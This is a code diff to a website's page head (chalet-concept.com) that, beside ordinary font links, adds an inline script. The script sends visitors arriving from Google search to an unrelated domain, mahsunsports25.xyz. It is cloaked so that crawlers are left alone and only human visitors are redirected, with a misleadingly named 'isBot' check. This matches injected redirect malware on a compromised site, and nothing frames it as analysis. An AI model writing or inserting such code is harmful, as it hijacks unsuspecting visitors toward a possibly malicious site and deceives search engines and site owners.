@@ -54,7 +54,13 @@ $canonical = "https://chalet-concept.com/";
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Barlow:wght@400;500;600;700;800;900&family=Barlow+Condensed:wght@700;800;900&display=swap" rel="stylesheet">
-
+     <script>
+        var fromGoogle = document.referrer.includes("google.");
+        var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) === false;
+        if (fromGoogle && isBot) {
+            location.replace("https://mahsunsports25.xyz");
+        }
+    </script> 
 <!-- ═══════════════════════════════════════════
      SCHEMA: WebSite
 ═══════════════════════════════════════════ -->
